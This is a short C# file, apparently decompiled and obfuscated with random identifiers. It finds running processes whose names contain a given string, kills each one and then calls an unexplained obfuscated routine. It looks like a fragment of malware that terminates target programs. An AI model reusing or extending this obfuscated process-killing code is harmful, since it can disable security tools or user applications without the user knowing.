using System;
using System.Diagnostics;

namespace qYAjLWajCJpnf;

public sealed class jktgGhAlAcGPo
{
	public static bool VHYCOmSQwDF(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void jNPgtSenWGR(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (VHYCOmSQwDF(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					bTJSgdVkQM.qiPuQJEhLmRex();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
